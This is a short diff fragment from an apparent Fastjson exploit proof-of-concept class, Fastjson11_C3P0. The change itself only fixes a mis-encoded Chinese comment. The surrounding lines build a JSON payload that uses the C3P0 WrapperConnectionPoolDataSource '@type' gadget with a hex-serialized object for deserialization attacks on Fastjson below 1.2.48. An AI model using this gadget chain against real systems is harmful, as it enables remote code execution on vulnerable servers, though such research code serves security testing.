@@ -12,7 +12,7 @@ public class Fastjson11_C3P0 {
         		+ "    \"@type\": \"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\", \r\n"
         		+ "    \"userOverridesAsString\": \"HexAsciiSerializedMap:"+payloadHex+";\"\r\n"
         		+ "}";
-    	//<1.2.48 and C3P0 ¶þ´Î·´ÐòÁÐ»¯
+    	//<1.2.48 and C3P0 二次反序列化
 //        poc = "{\r\n"
 //        		+ "    \"a\": {\r\n"
 //        		+ "        \"@type\": \"java.lang.Class\", \r\n"
